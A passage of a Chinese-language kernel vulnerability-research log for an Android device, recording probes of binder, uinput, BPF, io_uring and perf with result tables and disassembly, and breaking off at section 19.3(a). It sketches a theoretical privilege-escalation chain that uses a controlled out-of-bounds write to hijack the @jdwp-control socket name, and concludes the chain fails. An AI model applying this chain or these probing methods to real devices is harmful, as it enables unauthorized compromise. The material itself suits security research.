# 13. ★★ binder 第二轮: 调用可通, 传对象被挡 (面已定性)
### 13.1 关键对照: 带对象 vs 不带对象 (工具 `C://qemu_test//binder_obj.c`)
| 变体 | 首次回执 | 判定 |
|---|---|---|
| **A 不带任何对象**(data_size=8, offsets_size=0) | BR_NOOP + **BR_TRANSACTION_COMPLETE** + **BR_REPLY**(带 Parcel) | **成功! servicemanager 真的回了包** |
| B FD 对象(type=5, 真实 fd, TF_ACCEPT_FDS) | BR_NOOP + BR_FAILED_REPLY | 被拒 |
| C FD 对象(type=5, 无 TF_ACCEPT_FDS) | BR_NOOP + BR_FAILED_REPLY | 被拒(内核自身的门) |
| D HANDLE 对象(type=3, handle=0) | BR_NOOP + BR_FAILED_REPLY | 被拒(本进程没有该 ref) |
- ★ 先纠正上一轮我自己的错误: binder UAPI 的类型常量是
  **1=BINDER 2=WEAK_BINDER 3=HANDLE 4=WEAK_HANDLE 5=FD 6=FDA 7=PTR**
  (上一轮我把 FD 当成 2 了, 实际 2 是 WEAK_BINDER ⇒ 那轮的类型标注意义要重读)
- `service list` 从 shell 能正常列出 327 个服务 ⇒ **shell 域确实被允许调用 servicemanager** ✓
  与我们 A 变体拿到 BR_REPLY 完全一致 ✓

### 13.2 结论(面已定性)
- **我们能用 binder "调用"服务**(不带对象的事务: 目标查找 → 分配目标缓冲 → 入队 → 回包 全通)
- **但不能"传对象"**: 携带 binder 对象(FD/BINDER/HANDLE)的事务一律 BR_FAILED_REPLY,
  原因分两类: 内核对 `TF_ACCEPT_FDS`/ref 存在性的校验(C/D), 以及 **SELinux 的 binder 传输钩子**
  (`binder transfer` / `binder transfer_file` / `binder transfer_binder`, 即 shell→servicemanager 不许传对象)
- ⇒ **binder 最经典的"对象翻译"bug 区(`binder_translate_fd`/`_binder`/`_handle`)对我们的域不可达** ✓
  这是继 HID/ldisc 之后又一块被定性关闭的面, 而且这次是先建立了"可用的 binder 客户端"(A 变体)再否掉外围
- 仍可继续的方向(留档): ① 用**合法 Parcel** 与 servicemanager 正常交互(它接受我们的调用),
  即把 A 变体做成真正的 `getService()` 调用 —— 但这属于"用服务"而非"找内核 bug";
  ② 把 fuzz 面转到**目标进程的 Parcel 解析**(那是 system_server/servicemanager 的用户态解析, 不在本内核漏洞范畴);
  ③ 回到"零写原语"的收口路线(见 §9.2 能力总表)。

### 13.3 工具清单更新
| 工具 | 用途 |
|---|---|
| `binder_probe.c` | binder 可达性 + 任意 data_size/offsets_size/offsets[] 的事务 + BR_* 回执解码 |
| `binder_obj.c` | 携带合法 `flat_binder_object`(type/handle/flags/cookie 可选)的事务, 用于打 translate 分支 |
| `tty_probe.c` | ptmx/ldisc 能力侦察 |
| `uhid_dfuzz.c` | 描述符极端值(Report Count / 嵌套 Collection), 判据 = UHID_START |


---
# 14. ★★★ 战略结论: 原语的能力边界与"理论上可行但走不通"的链
### 14.1 抽象名 socket 清单(设备实况, /proc/net/unix 共 913 条, 其中 @ 开头 34 条)
值得注意的"别人的"抽象名 socket:
```
@mobilelogd(STREAM)  @time_genoff(STREAM, inode 666)  @mmServer  @resmon  @netopt  @perfsdkmon
@app_gc_wait_listener  @rms_gc_listen  @dexopt_compile_listen_to_report  @atcid_vendor_socket
@atraced  @THERMALE_UI  @vdtf_pivot  @gplisnr@  @com.android.internal.os.WebViewZygoteInit/<uuid>
★ @jdwp-control  Type=0x0005(SOCK_SEQPACKET)  St=01(监听中)  inode 46692   ← adbd 的 JDWP 控制口
  (另有 12 条 108 个 '@' 的超长匿名名, Type=0x0005, 应为 adb/libc 的匿名通道)
```
### 14.2 理论利用链(名字抢占 → JDWP)
1. 用零写把 **`@jdwp-control` 那条 listening socket 的 `unix_address.len` 清零** ⇒ 它名字变"空闲"
   (监听本身不受影响, 只是按名字查不到) —— 需要受害者正好是它的 addr
2. 我们立刻用 **SOCK_SEQPACKET** `bind("@jdwp-control")` 抢下这个名字
3. `listen()` 后, 每个**开启了调试**的应用进程里的 `adbconnection_client` 会连上来,
   并按协议**把自己的 PID 与一个 JDWP 控制 socket(SCM_RIGHTS fd)交给我们**
4. 我们即持有一条通往该应用进程的 JDWP 通道 ⇒ JDWP 协议支持任意方法调用 ⇒
   **在该应用进程内执行代码**(拿到的是该应用的权限/SELinux 域)

### 14.3 ★ 为什么这条链在本原语下走不通(战略边界)
- 第 1 步要求"受害者正好是 `@jdwp-control` 的 `unix_address`", 而我们的写是**只能打相邻对象**:
  必须让 buffer 落在**别人对象所在的页**里 —— 但我们的可靠性正来自"占满整页 = 受害者全是我们自己的对象";
  不占满页时受害者是谁完全随机(kmalloc-128 有约一万页, 命中特定对象的概率 ~1e-4)
- ⇒ **本原语的本质边界: "盲、相邻、前缀清零"。它能稳定地改我们自己的对象(名字/refcount/SELinux 状态),
  但无法指定要改哪个别人的对象** ⇒ 一切依赖"打中特定外来对象"的链(refcount UAF、名字抢占系统服务、
  改别人的 sksecc 等)都不成立
- ⇒ 结论: **本 bug 单独无法提权**, 它的价值是:
  ① 一个可复现、可精确定位、可反复运行(不重启)的 kmalloc-128 受控越界写原语(工程资产);
  ② 可达 SELinux socket 状态(DoS/降级方向);
  ③ 完整的"可达面阴性地图"(kgsl / hid-multitouch 全链路 / uinput+FF / SYSVIPC+keyring /
     ptmx+ldisc / binder), 以及每块面被否的具体原因与证据
- 若要继续冲提权, 需要的是**另一种原语**(能写到指定地址/指定对象), 或在这个 kernel 上另找一个
  可写可控内容、(最好是)可指定对象的 bug —— 而不是在现有原语上继续想办法


---
# 15. uinput 面: 位图/ABS/FF 三个分支全部关闭(反汇编 + 实测)
### 15.1 UI_SET_*BIT 有逐类型范围校验(反汇编证据)
`uinput_ioctl_handler`@0xffffffc01018443c 里, 每一族位图都先做范围检查, 超范围直接 EINVAL:
```
10184518  cmp x24, #0x1f   → mov w23, #-0x16(EINVAL)   ; EV_MAX   (evbit  EV_CNT=0x20)
101846e0  cmp x24, #0x2ff  → mov w23, #-0x16           ; KEY_MAX  (keybit)
1018472c  cmp x24, #0xf    → mov w23, #-0x16           ; SW_MAX   (swbit)
10184778  cmp x24, #0x3f   → mov w23, #-0x16           ; ABS_MAX  (absbit)
```
⇒ **"位号不校验 ⇒ 任意偏移置位写"这条经典 bug 在本机不成立** ✓(而它本来是我最想要的那类原语:
比"前缀清零"强得多)。同一函数里还有 `in_compat_syscall` 风格的线程标志检查(compat 结构体尺寸分支) ✓

### 15.2 实测
| 测试 | 结果 |
|---|---|
| `UI_SET_EVBIT(1)` / `(3)`、`UI_SET_KEYBIT(30)` (全合法) | **全部 EINVAL** |
| `UI_SET_EVBIT(0x40/0x1000/0x100000/0x1000000)` (超范围) | 全部 EINVAL |
| `UI_DEV_SETUP` (name/id) | **成功(0)** ⇒ ioctl 面本身没被封 |
| `UI_DEV_CREATE` | 成功(0) 但设备无任何事件位 ⇒ 无用 |
| `UI_ABS_SETUP` (code=0x10 合法 / 0x40 / 0x1000) | 全部失败(EINVAL / **ERANGE**) |
| `UI_DEV_SETUP` 带 `ff_effects_max=0xffffffff` | setup 被接受, 但后续 CREATE 失败 |
- ⚠ 遗留疑问(低优先): **合法位号也返回 EINVAL** 这一点没有被完全解释(范围检查只解释超范围那些)。
  可能是该 ioctl 的状态/顺序要求, 或 SELinux 的 ioctl 中介, 或 ioctl 号在该 kernel 构建下不同。
  但无论原因如何, **结论不变: 这一族 ioctl 对我们不可用**, 且范围校验确实存在(§15.1) ⇒ 该面关闭 ✓
- 设备 uptime 全程连续 ⇒ 无崩溃

### 15.3 工具
`uinput_bits.c`(位号扫描) / `uinput_abs.c`(UI_ABS_SETUP + ff_effects_max) / `uinput_seq.c`(先 SETUP 再设位图的正确顺序)


---
# 16. ★★★ 系统调用面侦察: 两块新的可达面(BPF 被 SELinux 关, io_uring + perf 开放)
### 16.1 sysctl / 配置(设备实况)
| 项 | 值 | 含义 |
|---|---|---|
| `/proc/sys/kernel/perf_event_paranoid` | **-1** | 最宽松: perf(含**内核级**事件)对非特权完全开放 |
| `/proc/sys/kernel/unprivileged_bpf_disabled` | **0** | 内核允许非特权 BPF |
| `CONFIG_IO_URING` / `CONFIG_BPF_SYSCALL` / `CONFIG_BPF_JIT_ALWAYS_ON` | y / y / y | 都编进来了 |
⇒ **项目此前只把 perf/BPF 当"泄漏 KASLR 的工具"用过, 从未做过漏洞审计** ⇒ 这是两块全新的可达面。

### 16.2 BPF: 被 SELinux 关掉(实测)
```
BPF_MAP_CREATE(ARRAY)     → -1 errno=13(EACCES)
BPF_PROG_LOAD(sock_filter)→ -1 errno=13(EACCES)
```
⇒ 尽管 `unprivileged_bpf_disabled=0`(内核允许), **SELinux 对 shell 域拒绝了 bpf** ✓ ⇒ 该面关闭
(这解释了此前 `bpf_test` 为什么没有下文。)

### 16.3 io_uring: 可达 + 参数校验扎实(实测)
```
io_uring_setup(1)/(8) 成功;  (0)/(65535)/(0x7fffffff) → EINVAL
REGISTER_BUFFERS  nr=1 → EFAULT(真的去校验了我们的 iovec); nr=0xffff/0x7fffffff → EINVAL
REGISTER_FILES    nr=4 → EBADF(环形 fd 本身不可注册);        nr=0xffff/0x7fffffff → EMFILE
REGISTER_EVENTFD  nr=1 → EINVAL(fd 不是 eventfd);           nr=0xffff → EINVAL
FILES_UPDATE      off=0 / 0xffffffff / 0x7fffffff + nr 大 → 全 EINVAL
io_uring_enter(submit=0xffffffff, GETEVENTS) → 0(只处理 SQ 中实际存在的, 符合预期)
设备 uptime 全程连续 ⇒ 无崩溃
```
⇒ **参数层(超范围 nr_args / offset / setup 边界)全部被拒** ✓; 但需注意:
**opcode 级(30+ 个 `IORING_OP_*` 的实现)与 poll/timeout/rsrc 时序面完全没有审** ——
io_uring 的历史 CVE 大多在那类"协议级 UAF", 需要专门的多轮工程, 不是一次参数 fuzz 能覆盖的

### 16.4 由此产生的下一步优先级(更新)
1. **★ perf 面审计(最高优先)**: `perf_event_paranoid=-1` 意味着连内核级事件、`PERF_SAMPLE_*`、
   各种 `perf_event_open` 组合都开放; perf 是 Linux 历史上 UAF 最密集的子系统之一(采样/上下文/
   事件组/`PERF_EVENT_IOC_*`)。项目此前只用它读 KASLR, **完全没有审过**。
2. **★ io_uring opcode 级**: 可达已确认、参数层已确认扎实 ⇒ 要做的是选若干 `IORING_OP_*`
   (poll/timeout/sendmsg/splice/rsrc_update 类)做事协议级序列测试。
3. BPF(关)、uinput(关)、binder 对象(关)、ldisc(关)、HID 全链路(关) —— 见 §8/§13/§15 等。

### 16.5 工具
`bpf_probe.c`(BPF/io_uring 可达性) / `uring_fuzz.c`(io_uring 恶意参数一轮)


---
# 17. ★★ perf 面: 侦察结果(仅限自身, 但能力很完整) + raw 事件未校验
### 17.1 可达性(工具 `C://qemu_test//perf_probe.c`, 设备 uptime 全程连续)
| 能力 | 结果 |
|---|---|
| 自身进程各事件类型: SW_CPU_CLOCK / SW_TASK_CLOCK / SW_PAGE_FAULTS / **HW_CPU_CYCLES** / **HW_CACHE** / **RAW** | **全部成功** |
| `inherit`(子进程继承事件) | **成功** ⇒ perf 历史上 UAF 最集中的特性可用 |
| `pid=1`(init) / `pid=-1,cpu=0`(全系统) | **EACCES** ⇒ 跨进程/全系统采样被挡(内核用 `ptrace_may_access` 判定, 我们只能看同 uid) |
| 自身事件 ioctl: ENABLE / DISABLE / RESET / PERIOD / ID | 全部成功(ID 递增) |
| `SET_FILTER` | EINVAL(只对 tracepoint 事件有效, 预期) |
| mmap(nr_pages = 0/2/4) | 全部成功 ⇒ **环形缓冲可读** |
| 硬件断点 `bp_type=R/X` + **用户地址** | **成功**(fd=10/11) |
| 硬件断点 + **内核地址**(动态/静态 _text) | **EINVAL** ⇒ arm64 平台不支持内核地址断点(非策略限制) |
⇒ 结论: **perf 是"仅限自身"但能力完整的面**: 全部事件类型(含 RAW 硬件事件) + inherit + mmap 环形缓冲
  + ioctl 全通。价值在于**它是一个未被审计的、协议复杂的自省子系统**(perf 历史上 UAF 极多)。

### 17.2 ★ RAW 事件的 config 完全不校验(实测)
```
RAW config = 0 / 0xff / 0xffff / 0xffffffff / 0x100000000 / 0x8000000000000000
           / 0x41414141414141 / 0xdeadbeef  → **全部成功**(fd=12)
RAW + config1/config2 非零                      → 成功
HW_CACHE 各种 cache-id 组合                     → EINVAL(该路径有校验)
```
⇒ `PERF_TYPE_RAW` 的 `config`(以及 `config1/config2`)会**未经校验地**进入 PMU 编程路径
(`armv8pmu` 对 raw 事件跳过 event-map 校验)。本机是 **4×A78 + 4×A55 异构 SoC**, 任务型事件会
在两种 PMU 之间迁移 ⇒ 同一个 raw 事件会在**两种 PMU 上分别编程**:
- `config` 的 bit63 在 armv8 里是"long event/64-bit"提示 → 不同 PMU 的 64 位计数器支持不同
  ⇒ **异构 PMU × 未校验 raw config** 是 arm64 perf 历史上的 bug 温床(下一步重点)
- `config1/config2` 进入 PMU **filter** 编程(`armv8pmu_set_event_filter`), 同样未校验
⇒ 目前实测**未崩溃**, 但这条路径(计数器选择/64 位提示/filter 编程)值得专门做一轮定向测试

### 17.3 perf 面下一步(具体可执行)
1. **异构 PMU × raw config bit63**: 用 `config` 最高位 + 各种 event-index 组合, 让事件在 A78/A55
   两种 PMU 上迁移(绑核/解绑反复), 观察是否有计数器选择错配导致的异常(崩溃/oops)。
2. **filter 路径**: 系统性给 `config1/config2` 各种"范围型"取值(起止地址/掩码), 走
   `armv8pmu_set_event_filter`。
3. **inherit + fork/exit 高频扰动**: perf 历史 UAF 的经典配方(inherited event 的父子生命周期)。
4. **环形缓冲读取**: mmap 后可读元数据页与数据页, 值得测 `PERF_EVENT_IOC_*` 与 ring 状态的组合。
5. 已关闭的邻居面: BPF(SELinux EACCES)、io_uring 参数层(校验扎实, 仅 opcode 级未审)、
   uinput、binder 对象、ldisc、HID 全链路。


---
# 18. ★★ perf 面审计结果: 多轮定向测试全部干净 (含一处上游 UAPI 怪癖)
结论先行: **perf 是一个"仅限自身但能力完整"的面, 校验覆盖到位, 未发现可用点**。
全部测试设备 uptime 连续(1h26m 未复位), 零崩溃。

### 18.1 设备能力(仪器化实测)
```
cpu0-3  midr=0x412fd050  Cortex-A55  1.80 GHz   (小核)
cpu4-7  midr=0x411fd411  Cortex-A78  2.40/2.52 GHz (大核)
perf_event_paranoid = -1     perf_event_max_sample_rate = 30750    perf_event_mlock_kb = 516
```
| 能力 | 结果 |
|---|---|
| 自身进程: SW_*/HW_CPU_CYCLES/HW_CACHE/**RAW** | 全部可开 |
| `inherit` / 组(leader+N siblings) / mmap 环形缓冲 | 全部可用 |
| `pid=1`(init) / `pid=-1,cpu=0`(全系统) | **EACCES**(`ptrace_may_access` 判定 ⇒ 只能看同 uid) |
| 硬件断点 用户地址 R/W/X + len 1/2/4/8 | **可建** |
| 硬件断点 **内核地址**(`~0` / 真机 `_text`) | **EPERM(1) / EINVAL** ⇒ 内核断点路线关闭 |
| ioctl: ENABLE/DISABLE/REFRESH/RESET/PERIOD/ID/PAUSE_OUTPUT | 全部可用 |

### 18.2 异构 PMU × 未校验 raw config(工具 `perf_hetero.c`)
用 `sched_setaffinity` 在 cpu0(A55) ↔ cpu7(A78) 间迁移, 让同一事件在两种 PMU 上反复 program/unprogram:
```
cfg=0x11(CPU_CYCLES)            A55=142,774,266  A78=143,470,363   ← 两核都真计到数
cfg=0x11|bit63                 A55=143,404,945  A78=143,076,765   ← bit63 无影响
cfg=0x00/0x3c/0xffff/0xffffffff     计数 0 但 open 成功、不报错、不崩(PMU 里无效选择子只是不计数)
config1(bit0=long event) 全值 0x0~0xffffffffffffffff   全部接受并正常工作(l两 PMU 上都计数)
```
⇒ **未校验的 raw config 确实进入 PMU 编程路径, 但实际后果只是"无效事件号计 0"**, 无异常。
- 计数器耗尽测试: 同核连开 20 个 long (chained 64bit) 事件 + 20 个 32bit 事件**全部成功**
  ⇒ kernel 用**多路复用**(time-slice), 不存在"计数器耗尽"可利用态
- 事件组跨 4 个 CPU 迁移(leader + 3 siblings): 正常, `PERF_EVENT_IOC_ID` 报 id ✓
- **inherit + 200 次 fork/exit(含两种 PMU 间迁移)**: 正常, 计数累加, 无 UAF 迹象

### 18.3 采样参数 / ioctl 参数极端值(工具 `perf_adv.c`)
| 输入 | 结果 |
|---|---|
| `sample_type` = ~0 / 0xffffffff / 单高位 / 0x5555… | **一律 EINVAL** ⇒ 该字段严格白名单校验 |
| `sample_max_stack` = 0/1/2/127 | 成功; **65535 → EOVERFLOW(75)** ⇒ 受 sysctl `perf_event_max_stack` 上界管 |
| `sample_regs_user`=all + `sample_stack_user`=0xffffffff | 接受(不崩) |
| FREQ 模式 `sample_freq=0` | 接受(无害); `0xffffffff` → EINVAL |
| `PERIOD` = 0 / ~0 / 0x8000… | **EINVAL**; 1/2/100 成功 |
| 同任务 leader + **31 siblings**(共 32 事件)全开 + 多路复用 | 正常计数 |
| `SET_BPF(0)` / `SET_FILTER` / `PAUSE_OUTPUT` | EBADF / EINVAL / EINVAL ⇒ 各有校验 |
| `SET_OUTPUT` 链接两事件 / 自指 / 非法 fd | EINVAL / EINVAL / EBADF; **`fd=-1`(解绑)成功**; 事件已 mmap 出 rb 后一律 EINVAL |

### 18.4 ★ 上游 UAPI 怪癖: `MODIFY_ATTRIBUTES` 的 size 字段是 8(不是结构体尺寸)
**发现过程**: 首次用教科书写法 `_IOW('$', 0xb, struct perf_event_attr)`(= `0x4078240b`)→ 全部 **ENOTTY**。
反汇编 `_perf_ioctl`@0xffffffc0104b6c40(二进制搜索常量折叠, 与 `QUERY_BPF`/`ID`/`PERIOD` 逐一比对验证解码方法正确):
```c
104b6c6c  mov  w9, #0x2407 ; movk w9,#0x4004,lsl#16   → 0x40042407  (二分枢轴)
104b6d50  mov  w8, #0x2403 ; movk w8,#0x4008,lsl#16   → 0x40082403  (枢轴)
104b6d60  mov  w8, #0x2404 ; movk w8,#0x4008,lsl#16   → 0x40082404 = PERIOD(size 8 = __u64) ✓
104b6d70  mov  w8, #0x2406 ; movk w8,#0x4008,lsl#16   → 0x40082406 = SET_FILTER(char*) ✓
104b6d80  mov  w8, #0x240b ; movk w8,#0x4008,lsl#16   → 0x4008240b = MODIFY_ATTRIBUTES  ★ size=8
104b6dc8  mov  w8, #0x2407 ; movk w8,#0x8008,lsl#16   → 0x80082407 = ID(_IOR) ✓
104b6dd8  mov  w8, #0x240a ; movk w8,#0xc008,lsl#16   → 0xc008240a = QUERY_BPF(_IOWR, 2×u32) ✓
104b6e00  mov  w8, #0x2408 ; movk w8,#0x4004,lsl#16   → 0x40042408 = SET_BPF(__u32) ✓
104b6e0c  mov  w8, #0x2409 ; movk w8,#0x4004,lsl#16   → 0x40042409 = PAUSE_OUTPUT(__u32) ✓
```
**size 扫描确认**(工具 `perf_mod.c`, nr=0xb, size 0x0~0x400 步长 4): **只有 size=0x8 被接受**。
**全命令集枚举**(工具 `perf_iocsw.c`, dir×nr(0-0x1f)×size 共 1000+ 组合):
```
none 0/1/2/3  size 0     → 0x2400/0x2401/0x2402/0x2403  ENABLE/DISABLE/REFRESH/RESET ✓
none 5        size 0     → 0x2405                        SET_OUTPUT ✓
W    4        size 8     → 0x40082404                    PERIOD ✓
W    6        size 8     → 0x40082406                    SET_FILTER ✓
W    8        size 4     → 0x40042408                    SET_BPF ✓
W    9        size 4     → 0x40042409                    PAUSE_OUTPUT ✓
W    11       size 8     → 0x4008240b                    MODIFY_ATTRIBUTES ★
R    7        size 8     → 0x80082407                    ID ✓
RW   10       size 8     → 0xc008240a                    QUERY_BPF ✓
(其余 1000+ 组合全部 ENOTTY)
```
**溯源(web)**: 该 ioctl 的**原始上游补丁**(Jiri Olsa/Milind Chabbi, 2017)定义为
`_IOW('$', 10, struct perf_event_attr *)` —— **指针类型**, size 即 8; 后 `QUERY_BPF` 占 nr=10,
本宏顺移到 nr=11 但**指针类型被保留** ⇒ 上游本态就是 `_IOW('$',0xb, struct perf_event_attr *)` = 0x4008240b。
⇒ **不是厂商改动、不是 bug, 是上游 UAPI 宏一处"指针 vs 值"怪癖**;
本内核整个 perf ioctl 面**与上游完全一致**。
- 对我们的意义(方法论): 按直觉写成值类型的用户态代码会被 ENOTTY 静默挡住 ——
  ⇒ **审计 ioctl 必须从内核实际常量反推, 不能沿用头文件的想当然写法** (本轮我先踩了这个坑)。

### 18.5 ★ MODIFY_ATTRIBUTES 的真实可达路径(工具 `perf_bp.c`)
处理器行为把代码路径完整暴露(返回值即证据):
```
同 type 改 sample_period      → EOPNOTSUPP(95)  ⇒ perf_event_modify_attr: 非 BREAKPOINT 一律 EOPNOTSUPP
改 type(SOFTWARE→RAW)         → EINVAL          ⇒ 先做 event->attr.type != attr->type 检查
结构内 size>PAGE_SIZE(0xffff) → E2BIG(7)        ⇒ perf_copy_attr 上界
结构内 size<VER0(8)           → E2BIG(7)        ⇒ perf_copy_attr 下界
```
⇒ 推论: **该 ioctl 只支持 `PERF_TYPE_BREAKPOINT`**, 而硬件断点我们恰好能建 ⇒ 定向打通:
| MODIFY 目标 | 结果 |
|---|---|
| addr = 我们自己的页 / 页+4 / **addr=0** | **成功(0)** |
| addr = 0x414141414141(未映射) | EINVAL |
| addr = `~0` | **EPERM(1)**(内核地址 → 权限门) |
| addr = 真机 `_text` 0xffffffe65f280000 | EINVAL(内核地址 → 地址校验) |
| len = 1/2/4/8/**3** | 成功; len = 0 / 0xff → EINVAL |
| 200 次 modify(addr/type/len 轮换)+触发 | 全部成功, 无崩溃 |
| 禁用中 MODIFY / fork 之后 MODIFY | 成功 |
⇒ 路径本身 `perf_event_modify_breakpoint → modify_user_hw_breakpoint` 可达且**校验干净**;
**内核地址断点被拒(EPERM/EINVAL)** ⇒ "把断点设进内核"这条最有价值的路关闭 ✓

### 18.6 perf 面结论
- **perf 是"仅限自身"的面**(跨进程/全系统被 `ptrace_may_access` 挡), 但能力完整: 全事件类型(含 RAW)
  + inherit + 组 + mmap 环形缓冲 + 全套 ioctl + 用户地址硬件断点。
- **校验扎实**: sample_type 白名单、sample_max_stack 上界、PERIOD 溢出拒绝、断点地址/长度校验、
  ioctl 参数各有校验; 未校验的只有 RAW `config/config1/config2`, 后果仅为"无效事件号计 0"。
- **未发现可用点**; 唯一"新发现"是上游 UAPI 宏怪癖(§18.4), 无安全影响, 但有方法论价值。
- **perf 面关闭** ✓ —— 这是继 kgsl / hid-multitouch 全链路 / uinput / SYSVIPC+keyring / ptmx+ldisc /
  binder / BPF 之后, 第 **8** 块被定性关闭的面。

### 18.7 工具清单(本轮新增)
| 工具 | 用途 |
|---|---|
| `perf_hetero.c` | 异构 PMU(A55/A78)迁移 × raw config / long event 链 / 计数器耗尽 / 组迁移 / inherit+fork churn |
| `perf_adv.c` | SET_OUTPUT / MODIFY_ATTRIBUTES / PERIOD / sample_type / max_stack / 多路复用 / 各 ioctl 极端参数 |
| `perf_mod.c` | 反推内核真实 ioctl 命令号(nr=0xb 的 size 扫描) + SET_OUTPUT 正确语义 |
| `perf_bp.c` | 走特殊命令号打通 MODIFY_ATTRIBUTES 的 breakpoint 路径 |
| `perf_iocsw.c` | perf ioctl 命令集全枚举(dir×nr×size), 判据 = 返回非 ENOTTY |

### 18.8 ★ 工具坑(自己踩的, 记录以免重犯)
1. **`PERF_EVENT_IOC_SET_OUTPUT` 是 `_IO('$',5)`(无尺寸), 且 ioctl 的 arg 本身就是 fd**(内核 `fdget(arg)`),
   不是指针 —— 传 `&e2` 得到 EBADF, 传错尺寸得到 ENOTTY。
2. **`MODIFY_ATTRIBUTES` 必须用 `_IOW('$',0xb, struct perf_event_attr *)`**(指针写法, size=8)。
3. `struct perf_event_attr` 里 `sample_period`/`sample_freq` 是同一 union; 手写结构体时要用 union 才能
   保持偏移与总尺寸(0x78)正确。


---
# 19. ★★★ io_uring opcode 级审计: 面已定性关闭(被裁剪的早期 io_uring, 校验扎实)
结论先行: **本机的 io_uring 是一个被大幅裁剪的早期版本**(能力面比现代 io_uring 小一个数量级),
其已实现部分经功能性与边界双重测试**全部干净, 未发现可用点**。设备 uptime 连续 1h35m, 零崩溃。

## 19.0 ★ 先修正第 16 节一处错误
第 16 节我把 `IORING_REGISTER_FILES_UPDATE` 当成操作号 **9** 去测, 那是错的 ——
本内核 register 面根本没有该操作(见 §19.1), 项目号 9 也不存在。该节那几行"FILES_UPDATE"结论作废,
以本节为准。

## 19.1 ★ 结构指纹(反汇编级证据) —— 本机 io_uring 的真实能力边界
### (a) register 操作只有 0–5
`__arm64_sys_io_uring_register`@0xffffffc0105eaf80:
```
105eb034  cmp  w23, #0x5            ← w23 = register 操作号
105eb038  b.hi 0x105eb138           ← >5 直接 -EINVAL
105eb03c..105eb054  取 rodata 跳转表(6 项)后 br
105eb058  → bl io_sqe_buffer_register       = REGISTER_BUFFERS(0)
105eb078  → EINVAL if arg||nr; bl io_sqe_buffer_unregister  = UNREGISTER_BUFFERS(1)
105eb094  → [ctx+0x188]!=0 ? -EBUSY ; nr 为 0 或 >0x400 → EINVAL ; kmalloc(nr*8)
            + 逐 fd fget; 若 fd 非普通文件 → fput 并 -EBADF(105eb29c) ; 累加 [ctx+0x190]
                                                = REGISTER_FILES(2)
105eb0b4  → fput 循环 + kfree               = UNREGISTER_FILES(3)
105eb11c  → cmp w25,#1 → 必须恰好 1 个参数; copy_from_user 4B → eventfd_ctx_fdget
                                                = REGISTER_EVENTFD(4)
105eb19c  → eventfd_ctx_put                  = UNREGISTER_EVENTFD(5)
```
⇒ **没有 `FILES_UPDATE(6)`、没有 `EVENTFD_ASYNC(7)`、没有 `PROBE(8)`、没有 `PERSONALITY(9)`、
没有 `UNREGISTER_PERSONALITY(10)`、没有 `RESTRICTIONS(11)`、没有 `ENABLE_RINGS(12)`。**
⇒ 这**一举砍掉一整类 io_uring 攻击面**: personality 引用计数类 UAF、restriction 绕过、
`R_DISABLED`/`ENABLE_RINGS` 状态机等在本机**根本不存在**。
（也解释了实测 `REGISTER_PROBE → EINVAL`。）

### (b) SQE flags 只允许 0x1/0x2/0x4
`io_submit_sqe`@0xffffffc0105ebe6c:
```
105ebe94  ldrb w8, [x8, #0x1]       ← sqe->flags
105ebe98  cmp  w8, #0x7
105ebe9c  b.hi 0x105ec174           ← 105ec174: mov x22,#-0x16 (-EINVAL)
```
⇒ 只有 `IOSQE_FIXED_FILE(1)` / `IOSQE_IO_DRAIN(2)` / `IOSQE_IO_LINK(4)`;
**没有 `IOSQE_ASYNC(8)`、没有 `IOSQE_IO_HARDLINK(16)`、没有 `IOSQE_BUFFER_SELECT(128)`**。
实测 0x00–0x07 全部返回 0, 0x08–0xff 全部 -EINVAL ✓ 与反汇编一致。

### (c) 其它指纹
- `io_uring_setup` 返回 `features = 0x1` ⇒ **只有 `IORING_FEAT_SINGLE_MMAP`**, 连 `NODROP` 都没有
- `io_sqe_buffer_register`@0x105f1d40: `sub w8,w2,#1; cmp w8,#0x3ff; b.ls` ⇒ nr_args ∈ [1,0x400];
  `lsl x0, w23, #5` ⇒ kmalloc(nr*32); 逐条 `_copy_from_user` 16B(iovec);
  `sub x9,x8,#1; lsr x9,x9,#30; cbnz` ⇒ 拒绝 len=0 与 len>4GB; `get_user_pages(...,0x10001)`
  (FOLL_WRITE|FOLL_LONGTERM); 失败路径逐页回滚 + `kvfree`
- `io_get_req` 在多路复用耗尽时返回 -EAGAIN, 上报为 -EAGAIN ✓

## 19.2 ★ opcode 集判别: 本机只实现 0–11
**判别法**: 未实现的 opcode 会在 fd 解析**之后**、opcode 分派**之前**/处统一返回 `-EINVAL`,
因此"fd=-1 给 -EBADF、给合法 fd 给 -EINVAL"这个**双值形态** = 未实现; 而已实现的 opcode 会给出
**自己的特征性错误码或真实结果**。实测(工具 `uring_op2.c`, 每个 opcode × 7 种 fd):

| opcode | 特征结果 | 判定 |
|---|---|---|
| 0 NOP | 0 | **实现** |
| 1 READV | **0 / 真读到 5 字节** | **实现(功能证明)** |
| 2 WRITEV | 0 | **实现** |
| 3 FSYNC | 0 / -EINVAL | **实现** |
| 4/5 READ_FIXED / WRITE_FIXED | -EFAULT(地址越界) | **实现** |
| 6 POLL_ADD | 挂起后写数据得 **0x41=POLLIN\|POLLRDNORM** | **实现(功能证明)** |
| 7 POLL_REMOVE | **-ENOENT**(无目标) | **实现** |
| 8 SYNC_FILE_RANGE | 0 / **-ESPIPE** | **实现** |
| 9/10 SENDMSG / RECVMSG | **-ESOCKTNOSUPPORT(-88)** / -EFAULT | **实现** |
| 11 TIMEOUT | **-ETIME(-62)**(1ms 定时真的触发) | **实现(功能证明)** |
| 12–48 (含 TIMEOUT_REMOVE/ACCEPT/OPENAT/CLOSE/FILES_UPDATE/SPLICE/PROVIDE_BUFFERS/…) | 只有 {-EBADF,-EINVAL} 双值 | **一律未实现** |

**决定性功能反证**(工具 `uring_ops3.c`):
- `CLOSE(19)` 给合法 fd → **-EINVAL, 且之后 `fcntl(fd,F_GETFD)` 仍成功 ⇒ fd 没被关** ⇒ CLOSE 未实现 ✓
- `OPENAT(18)` 给合法路径 → -EBADF ⇒ 未实现 ✓
- `ACCEPT(13)` 给监听 socket → -EINVAL ⇒ 未实现 ✓
- `FILES_UPDATE(20)/SPLICE(30)/PROVIDE_BUFFERS(31)/REMOVE_BUFFERS(32)/TEE(33)` → 全 -EINVAL ⇒ 未实现 ✓
⇒ **`IORING_OP_LAST = 12`**: 只实现
`NOP / READV / WRITEV / FSYNC / READ_FIXED / WRITE_FIXED / POLL_ADD / POLL_REMOVE /
SYNC_FILE_RANGE / SENDMSG / RECVMSG / TIMEOUT`。
（对照上游: 这 12 个恰好是 5.4 枚举的**前 12 项**, 即枚举被截断在 TIMEOUT 处。）

## 19.3 ★ 打这 12 个里最危险的两处
### (a) 固定缓冲区路径 (工具 `uring_fixed2.c` / `uring_bidx.c`)
